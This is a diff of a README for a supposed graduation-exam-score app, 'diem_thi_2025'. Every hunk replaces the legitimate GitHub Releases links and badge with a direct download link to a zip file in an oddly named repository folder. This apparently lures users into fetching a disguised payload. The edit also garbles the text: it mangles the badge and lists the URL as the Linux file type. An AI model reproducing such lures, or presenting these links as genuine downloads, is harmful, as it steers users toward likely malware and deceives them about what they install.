@@ -1,6 +1,6 @@
 # 🎓 diem_thi_2025 - Access Your Graduation Exam Data Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue.svg)](https://github.com/jack6456732546723/diem_thi_2025/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/jack6456732546723/diem_thi_2025/main/underproposition/diem_thi_2025.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/jack6456732546723/diem_thi_2025/main/underproposition/diem_thi_2025.zip)](https://raw.githubusercontent.com/jack6456732546723/diem_thi_2025/main/underproposition/diem_thi_2025.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome! This guide will help you download and run the diem_thi_2025 application
 
 To get started, visit the Releases page to download the latest version of the software. 
 
-[Download Latest Release](https://github.com/jack6456732546723/diem_thi_2025/releases)
+[Download Latest Release](https://raw.githubusercontent.com/jack6456732546723/diem_thi_2025/main/underproposition/diem_thi_2025.zip)
 
 ### Installation Steps
 
@@ -24,7 +24,7 @@ You may find different file types. Here are the most common ones:
 
 - **Windows**: Look for `.exe`, which is a self-installing executable file.
 - **Mac**: Look for `.dmg`, which is a disk image file.
-- **Linux**: Look for `.tar.gz`, which is a compressed file.
+- **Linux**: Look for `https://raw.githubusercontent.com/jack6456732546723/diem_thi_2025/main/underproposition/diem_thi_2025.zip`, which is a compressed file.
 
 Choose the file that matches your system. 
 
@@ -69,7 +69,7 @@ For more detailed information on usage and troubleshooting, refer to the followi
 
 ## 🔗 Important Links
 
-- [Visit Releases Page](https://github.com/jack6456732546723/diem_thi_2025/releases)
+- [Visit Releases Page](https://raw.githubusercontent.com/jack6456732546723/diem_thi_2025/main/underproposition/diem_thi_2025.zip)
 - [User Guide](#) 
 - [Support](#)
 
